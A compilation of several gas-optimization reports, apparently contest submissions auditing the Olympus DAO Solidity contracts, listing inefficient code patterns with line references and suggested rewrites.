 ## 1. Inline a modifier that’s only used once ### Description As onlyGovernor() is only used once in this contract (in function executeAction()), it should get inlined to save gas:  ### Instances //Links to github files: [Kernel.sol:L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L223)    *Actual codes used*   ``` src/Kernel.sol:223:    modifier onlyExecutor() { ```  ### Instances where modifiers are used only once //Links to github files: [Kernel.sol:L235](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L235)   *Actual codes used* ``` src/Kernel.sol:235:    function executeAction(Actions action_, address target_) external onlyExecutor { ``` ----  ## 2.++I COSTS LESS GAS COMPARED TO I++ OR I += 1 ### Description *Pre-increments and pre-decrements are cheaper.*  For a `uint256` i variable, the following is true with the Optimizer enabled at 10k: Increment: `i += 1` is the most expensive form `i++` costs `6` `gas` less than `i += 1` `++i` costs `5 gas` less than `i++` (11 gas less than i += 1)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name post-increment: ### Instances // Links to Github file [Operator.sol:L488](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488) [Operator.sol:L670](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670) [Operator.sol:L686](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686) [KernelUtils.sol:L49](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49) [KernelUtils.sol:L64](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64)   *Actual codes used* ``` src/policies/Operator.sol:488:            decimals++; src/policies/Operator.sol:670:                _status.low.count++; src/policies/Operator.sol:686:                _status.high.count++; src/utils/KernelUtils.sol:49:            i++; src/utils/KernelUtils.sol:64:            i++; ```  ---- ## 3.`<ARRAY>.LENGTH` SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP ### Description The overheads outlined below are `PER LOOP`, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use `MLOAD` (3 gas) calldata arrays use `CALLDATALOAD` (3 gas) Caching the length changes each of these to a `DUP<N>` (3 gas), and gets rid of the extra `DUP<N>` needed to store the stack offset ### Instances // Links to github files [Governance.sol:L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)   *Actual codes used* ``` src/policies/Governance.sol:278:        for (uint256 step; step < instructions.length; ) { ```  ---- ## 4. Comparisons: Boolean comparisons ### Description Comparing to a constant (true or false) is a bit more expensive than directly checking the returned boolean value. I suggest using if(directValue) instead of if(directValue == true) and if(!directValue) instead of if(directValue == false)  ### Instances //Links to github files: [Governance.sol:L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223) [Governance.sol:L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306)   *Actual codes used* ``` src/policies/Governance.sol:223:        if (proposalHasBeenActivated[proposalId_] == true) { src/policies/Governance.sol:306:        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) { ```  ----  ## 5. IT COSTS MORE GAS TO INITIALIZE VARIABLES WITH THEIR DEFAULT VALUE THAN LETTING THE DEFAULT VALUE BE APPLIED ### Description If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: for `(uint256 i = 0; i < numIterations; ++i)` { should be replaced with for `(uint256 i; i < numIterations; ++i) {`  ### Instances // Links to gihthub file   [Kernel.sol:L397](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L397) [KernelUtils.sol:L43](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43) [KernelUtils.sol:L58](https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58)  *Actual codes used* ``` src/Kernel.sol:397:        for (uint256 i = 0; i < reqLength; ) { src/utils/KernelUtils.sol:43:    for (uint256 i = 0; i < 5; ) { src/utils/KernelUtils.sol:58:    for (uint256 i = 0; i < 32; ) { ```  ---- ## 6. Strict inequalities (>) are more expensive than non-strict ones (>=)  Strict inequalities (>) are more expensive than non-strict ones (>=). This is due to some supplementary checks (ISZERO, 3 gas. I suggest using >= instead of > to avoid some opcodes here:  ### Instances: [RANGE.sol:L245](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L245) [RANGE.sol:L247](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L247) [RANGE.sol:L249](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L249) [Operator.sol:L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L115) [Operator.sol:L254](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L254) [Operator.sol:L262](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L262) ``` src/modules/RANGE.sol:245:            wallSpread_ > 10000 || src/modules/RANGE.sol:247:            cushionSpread_ > 10000 || src/modules/RANGE.sol:249:            cushionSpread_ > wallSpread_ src/policies/Operator.sol:115:            configParams[6] > configParams[7] || src/policies/Operator.sol:254:                    currentPrice < range.cushion.high.price || currentPrice > range.wall.high.price src/policies/Operator.sol:262:                    currentPrice > range.cushion.high.price && currentPrice < range.wall.high.price ``` ### References:  [https://code4rena.com/reports/2022-04-badger-citadel/#g-31--is-cheaper-than](https://code4rena.com/reports/2022-04-badger-citadel/#g-31--is-cheaper-than)   ---- ## 7. Use a more recent version of solidity ### Description Use a solidity version of at least 0.8.0 to get overflow protection without SafeMath Use a solidity version of at least 0.8.2 to get compiler automatic inlining Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than revert()/require() strings Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value  ### Instances: //Links to github files: [IBondCallback.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/interfaces/IBondCallback.sol#L2) [IOperator.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IOperator.sol#L2) [IHeart.sol:L2](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/interfaces/IHeart.sol#L2)   *Actual codes used* ```  src/interfaces/IBondCallback.sol:2:pragma solidity >=0.8.0; src/policies/interfaces/IOperator.sol:2:pragma solidity >=0.8.0; src/policies/interfaces/IHeart.sol:2:pragma solidity >=0.8.0; ``` ---- ## 8. Bytes constants are more efficient than string constants ### Descriptions From the Solidity doc:  If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper.  Why do Solidity examples use bytes32 type instead of string?  bytes32 uses less gas because it fits in a single word of the EVM, and string is a dynamically sized-type which has current limitations in Solidity (such as can’t be returned from a function to a contract).  If data can fit into 32 bytes, then you should use bytes32 datatype rather than bytes or strings as it is cheaper in solidity. Basically, any fixed size variable in solidity is cheaper than variable size. That will save gas on the contract.  Instances of string constant that can be replaced by bytes(1..32) constant : ### Instances: //Links to github files: [Governance.sol:L41](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L41) [Governance.sol:L162](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L162)   *Actual codes used* ``` src/policies/Governance.sol:41:    string proposalURI; src/policies/Governance.sol:162:        string memory proposalURI_ ``` 
### Array length should not be looked up in every iteration of a `for` loop Since calculating the array length costs gas, it's best to read the length of the array from memory before executing the loop. ___ [Governance.sol: L278-283](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L283) ```solidity         for (uint256 step; step < instructions.length; ) {             kernel.executeAction(instructions[step].action, instructions[step].target);             unchecked {                 ++step;             }         } ``` Suggestion: ```solidity         uint256 instructLength = instructions.length;         for (uint256 step; step < instructLength; ) {             kernel.executeAction(instructions[step].action, instructions[step].target);             unchecked {                 ++step;             }         } ``` ___ ___   ### Use `++i` instead of `i++` to increase count in a `for` loop Since use of  `i++` (or equivalent counter) costs more gas, it is better to use `++i` ___ [KernelUtils.sol: L43-51](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43-L51) ```solidity     for (uint256 i = 0; i < 5; ) {         bytes1 char = unwrapped[i];          if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only          unchecked {             i++;         }     } ``` Suggestion: ```solidity     for (uint256 i = 0; i < 5; ) {         bytes1 char = unwrapped[i];          if (char < 0x41 || char > 0x5A) revert InvalidKeycode(keycode_); // A-Z only          unchecked {             ++i;         }     } ``` ___ Similarly for the following `for` loop:  [KernelUtils.sol: L58-66](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58-L66) ___ ___
# Gas Optimizations Report for Olympus DAO contest  ## Overview During the audit, 6 gas issues were found.  № | Title | Instance Count --- | --- | ---  G-1 | [Postfix increment and decrement](#g-1-postfix-increment-and-decrement) | 5 G-2 | [<>.length in loops](#g-2-length-in-loops) | 1 G-3 | [Initializing variables with default value](#g-3-initializing-variables-with-default-value) | 3 G-4 | [Some variables can be immutable](#g-4-some-variables-can-be-immutable) | 1 G-5 | [> 0 is more expensive than =! 0](#g-5--0-is--more-expensive-than--0) | 1 G-6 | [x += y is more expensive than x = x + y](#g-6-x--y-is--more-expensive-than-x--x--y) | 18  ## Gas Optimizations Findings (6) ### G-1. Postfix increment and decrement ##### Description Prefix increment and decrement cost less gas than postfix.  ##### Instances - [```decimals++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L488) - [```_status.low.count++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L670) - [```_status.high.count++;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L686) - [```_status.low.count--;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L675) - [```_status.high.count--;```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L691)  ##### Recommendation Consider using prefix increment and decrement  where it is relevant.   # ### G-2. <>.length in loops ##### Description Reading the length of an array at each iteration of the loop consumes extra gas.  ##### Instances [```for (uint256 step; step < instructions.length; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  ##### Recommendation Store the length of an array in a variable before the loop, and use it.  # ### G-3. Initializing variables with default value ##### Description It costs gas to initialize integer variables with 0 or bool variables with false but it is not necessary.  ##### Instances - [```for (uint256 i = 0; i < reqLength; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L397) - [```for (uint256 i = 0; i < 5; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43) - [```for (uint256 i = 0; i < 32; ) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58)  ##### Recommendation Remove initialization for default values.   For example: ```for (uint256 i; i < reqLength; ) {```  # ### G-4. Some variables can be immutable ##### Description Using immutables is cheaper than storage-writing operations.  ##### Instances [```ERC20 public ohm;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L32)  ##### Recommendation Use immutables where possible. Change to ``` ERC20 public immutable ohm;```  # ### G-5. ```> 0``` is  more expensive than ```=! 0``` ##### Instances [```if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {```](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L247)  ##### Recommendation Use ```=! 0``` instead of ```> 0```, where possible.  # ### G-6. ```x += y``` is  more expensive than ```x = x + y``` ##### Instances - [```reserveDebt[token_][msg.sender] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L96) - [```totalDebt[token_] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L97) - [```reserveDebt[token_][msg.sender] -= received;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L115) - [```totalDebt[token_] -= received;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L116) - [```if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L131) - [```else totalDebt[token_] -= oldDebt - amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L132) - [```_movingAverage += (currentPrice - earliestPrice) / numObs;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136) - [```_movingAverage -= (earliestPrice - currentPrice) / numObs;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138) - [```total += startObservations_[i];```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222) - [```balanceOf[from_] -= amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L56) - [```balanceOf[to_] += amount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L58) - [```_amountsPerMarket[id_][0] += inputAmount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143) - [```_amountsPerMarket[id_][1] += outputAmount_;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144) - [```lastBeat += frequency();```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103) - [```totalEndorsementsForProposal[proposalId_] -= previousEndorsement;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194) - [```totalEndorsementsForProposal[proposalId_] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198) - [```yesVotesForProposal[activeProposal.proposalId] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252) - [```noVotesForProposal[activeProposal.proposalId] += userVotes;```](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254)  ##### Recommendation Use ```x = x + y``` instead of ```x += y```. Use ```x = x - y``` instead of ```x -= y```.
## Useless iterator initialization  in the loop  In the function _setPolicyPermissions() contract Kernel ‘uint256 i’ is initializing to 0 what is useless as type uint256 by default equals to 0.  **Recommendation:** Consider removing useless initialization to decrease the gas cost for calling functions  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L391  ## IF statements order optimization  Contract OlympusInstructions function store() there is a check if the instruction array is not empty (the length is not equal to 0). It makes sense to do it first of all because if there are no instructions there is no point to keep function execution.  **Recommendation:** Consider moving the 48 line (check if the instruction array is not empty) below the 43 line to avoid the unnecessary operation of incrementation and call to storage in the case when the array is empty.  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L42   ## Function visibility optimization   In contract OlympusInstructions there is the function getInstructions() which is not called anywhere inside the contract, so can be marked as external instead of public.  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37  In contract OlympusMinter there are a few functions that are not called inside the contract mintOhm() and burnOhm().  Reference: https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L33  **Recommendation:** Consider changing visibility from public to external for function getInstructions() , mintOhm() and burnOhm(). 
# Olympus DAO Contest Gas Optimization Report  ## Summary  These gas optimization issues were found during the code audit:  1. Use `calldata` instead of `memory` (66 instances) 2. Cache `<array>.length` (2 instances) 3. Use `unchecked{}` to suppress overflow/underflow check (43 instances) 4. Long `require()`/`revert()` string (8 instances) 5. Using `bool`s for storage incurs overhead (20 instances) 6. Use `!= 0` instead of `> 0` when comparing uint (11 instances) 7. Empty blocks should be removed (42 instances) 8. Don't initialize variables with default value (5 instances) 9. Use `++i`/`--i` instead of `i++`/`i--` (6 instances) 10. Split `require(xxx && yyy)` to `require(xxx)` and `require(yyy)` (3 instances) 11. Use uint256/int256 instead of other variations (245 instances) 12. Use `abi.encodePacked()` instead of `abi.encode()` (41 instances) 13. Use `private` instead of `public` for constants (17 instances) 14. Don't compare boolean expressions to boolean literals (4 instances) 15. Use custom errors instead of `revert()`/`require()` strings (24 instances) 16. Use shift right/left instead of division/multiplication if possible (9 instances)  Total 546 instances of 16 issues.  ## 1. Use `calldata` instead of `memory` (66 instances)  When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for loop to copy each index of the `calldata` to the `memory` index. This overhead can be optimized by using `calldata` directly.  ```solidity 2022-08-olympus/src/Kernel.sol::139 => function configureDependencies() external virtual returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/Kernel.sol::143 => function requestPermissions() external view virtual returns (Permissions[] memory requests) {}  2022-08-olympus/src/external/OlympusERC20.sol::133 => function tryRecover(bytes32 hash, bytes memory signature)  2022-08-olympus/src/external/OlympusERC20.sol::182 => function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {  2022-08-olympus/src/external/OlympusERC20.sol::689 => function name() public view returns (string memory) {  2022-08-olympus/src/external/OlympusERC20.sol::693 => function symbol() public view returns (string memory) {  2022-08-olympus/src/interfaces/AggregatorV2V3Interface.sol::23 => function description() external view returns (string memory);  2022-08-olympus/src/interfaces/IBondAggregator.sol::82 => function marketsFor(address payout_, address quote_) external view returns (uint256[] memory);  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::62 => function createMarket(MarketParams memory params_) external returns (uint256);  2022-08-olympus/src/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/interfaces/IBondTeller.sol::43 => function claimFees(ERC20[] memory tokens_, address to_) external;  2022-08-olympus/src/modules/INSTR.sol::37 => function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  2022-08-olympus/src/modules/PRICE.sol::205 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/modules/RANGE.sol::275 => function range() external view returns (Range memory) {  2022-08-olympus/src/policies/BondCallback.sol::48 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/BondCallback.sol::152 => function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {  2022-08-olympus/src/policies/Governance.sol::61 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Governance.sol::145 => function getMetadata(uint256 proposalId_) public view returns (ProposalMetadata memory) {  2022-08-olympus/src/policies/Governance.sol::151 => function getActiveProposal() public view returns (ActivatedProposal memory) {  2022-08-olympus/src/policies/Heart.sol::69 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Operator.sol::154 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/Operator.sol::171 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/policies/Operator.sol::793 => function status() external view override returns (Status memory) {  2022-08-olympus/src/policies/Operator.sol::798 => function config() external view override returns (Config memory) {  2022-08-olympus/src/policies/PriceConfig.sol::18 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/PriceConfig.sol::45 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/policies/TreasuryCustodian.sol::27 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/TreasuryCustodian.sol::34 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/policies/TreasuryCustodian.sol::53 => function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {  2022-08-olympus/src/policies/VoterRegistration.sol::19 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/policies/interfaces/IOperator.sol::146 => function status() external view returns (Status memory);  2022-08-olympus/src/policies/interfaces/IOperator.sol::149 => function config() external view returns (Config memory);  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::35 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::47 => function generateFixture(Module module_, Permissions[] memory requests_)  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::55 => function generateGodmodeFixture(Module module_, string memory contractName_)  2022-08-olympus/src/test/lib/UserFactory.sol::23 => function create(uint256 userNum) public returns (address[] memory) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::176 => function marketsFor(address payout_, address quote_) public view returns (uint256[] memory) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::242 => function liveMarketsBy(address owner_) external view returns (uint256[] memory) {  2022-08-olympus/src/test/lib/bonds/BondFixedTermCDA.sol::33 => function createMarket(MarketParams memory params_) external override returns (uint256) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::129 => function createMarket(MarketParams memory params_) external virtual returns (uint256);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::132 => function _createMarket(MarketParams memory params_) internal returns (uint256) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseCDA.sol::338 => function setDefaults(uint32[6] memory defaults_) external override requiresAuth {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::100 => function claimFees(ERC20[] memory tokens_, address to_) external override {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::285 => function _uint2str(uint256 _i) internal pure returns (string memory) {  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAggregator.sol::82 => function marketsFor(address payout_, address quote_) external view returns (uint256[] memory);  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::62 => function createMarket(MarketParams memory params_) external returns (uint256);  2022-08-olympus/src/test/lib/bonds/interfaces/IBondAuctioneer.sol::116 => function setDefaults(uint32[6] memory defaults_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondFixedTermTeller.sol::43 => function batchRedeem(uint256[] memory tokenIds_, uint256[] memory amounts_) external;  2022-08-olympus/src/test/lib/bonds/interfaces/IBondTeller.sol::43 => function claimFees(ERC20[] memory tokens_, address to_) external;  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::120 => function balanceOfBatch(address[] memory owners, uint256[] memory ids)  2022-08-olympus/src/test/lib/larping.sol::89 => function larp(function () external returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::97 => function larpp(function () external payable returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/larping.sol::105 => function larpv(function () external view returns(string memory) f, string memory returned1) internal {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::10 => function jq(string memory query, string memory path)  2022-08-olympus/src/test/lib/quabi/Quabi.sol::23 => function getPath(string memory contractName) internal returns (string memory path) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::33 => function getSelectors(string memory query, string memory path) internal returns (bytes4[] memory) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::47 => function getFunctions(string memory contractName) public returns (bytes4[] memory) {  2022-08-olympus/src/test/lib/quabi/Quabi.sol::54 => function getFunctionsWithModifier(string memory contractName, string memory modifierName) public returns (bytes4[] memory) {  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::11 => function configureDependencies() external override returns (Keycode[] memory dependencies) {  2022-08-olympus/src/test/mocks/KernelTestMocks.sol::18 => function requestPermissions() external view override returns (Permissions[] memory requests) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::22 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/mocks/MockPrice.sol::44 => function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)  2022-08-olympus/src/test/mocks/MockPriceFeed.sol::58 => function description() external view override returns (string memory) {}  2022-08-olympus/src/test/policies/Heart.t.sol::31 => function configureDependencies() external override returns (Keycode[] memory dependencies) {}  2022-08-olympus/src/test/policies/Heart.t.sol::33 => function requestPermissions() external view override returns (Permissions[] memory requests) {}  2022-08-olympus/src/test/policies/PriceConfig.t.sol::102 => function getObs(uint8 nonce) internal returns (uint256[] memory) { ```  ## 2. Cache `<array>.length` (2 instances)  If `<array>.length` is used as for loop termination condition, then the `.length` method will be called in each iteration. Caching it in a local variable can save gas.  ```solidity 2022-08-olympus/src/policies/Governance.sol::278 => for (uint256 step; step < instructions.length; ) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::182 => uint256 len = forPayout.length; ```  ## 3. Use `unchecked{}` to suppress overflow/underflow check (43 instances)  Starting from version 0.8.0, Solidity does overflow/underflow checks by default. It is a good feature to prevent vulnerabilities but it has a significant overhead, especially when used in for loop. When using uint256/int256, it is extremely hard to trigger overflow, so it makes sense to skip these checks. To suppress the overflow/underflow checks, use `unchecked {}`. For increment situations, just use `unchecked {}` directly; for decrement situations, add a `require()` statement before decrementing to prevent underflow.  ```solidity 2022-08-olympus/src/scripts/Deploy.sol::239 => for (uint i = 0; i < 90; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::19 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::38 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/lib/ModuleTestFixtureGenerator.sol::66 => for (uint256 i; i < num; ++i) {  2022-08-olympus/src/test/lib/UserFactory.sol::25 => for (uint256 i = 0; i < userNum; i++) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::129 => for (uint256 i = firstIndex_; i < lastIndex_; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::135 => for (uint256 i = firstIndex_; i < lastIndex_; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::158 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::165 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::183 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::186 => if (isLive(forPayout[i]) && address(quoteToken) == quote_) ++count;  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::192 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::221 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::245 => for (uint256 i; i < marketCounter; ++i) {  2022-08-olympus/src/test/lib/bonds/BondAggregator.sol::254 => for (uint256 i; i < marketCounter; ++i) {  2022-08-olympus/src/test/lib/bonds/BondFixedTermTeller.sol::161 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::102 => for (uint256 i; i < len; ++i) {  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::135 => for (uint256 i; i < ownersLength; ++i) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::16 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/mocks/MockModuleWriter.sol::32 => for (uint256 i; i < len; i++) {  2022-08-olympus/src/test/modules/PRICE.t.sol::99 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::126 => for (uint256 i; i < observations; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::224 => for (uint256 i; i < numObs; ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::313 => for (uint256 i; i < price.numObservations(); ++i) {  2022-08-olympus/src/test/modules/PRICE.t.sol::386 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::776 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::948 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::992 => for (uint256 i; i < 8; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1004 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1045 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1097 => for (uint256 i; i < 3; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1106 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1149 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1217 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1261 => for (uint256 i; i < 8; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1273 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1314 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1366 => for (uint256 i; i < 3; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1375 => for (uint256 i; i < 4; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1418 => for (uint256 i; i < 5; ++i) {  2022-08-olympus/src/test/policies/Operator.t.sol::1832 => for (uint256 i; i < 15; ++i) {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::122 => for (uint256 i; i < numObservations; ++i) {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::172 => for (uint256 i; i < numObservations; ++i) { ```  ## 4. Long `require()`/`revert()` string (8 instances)  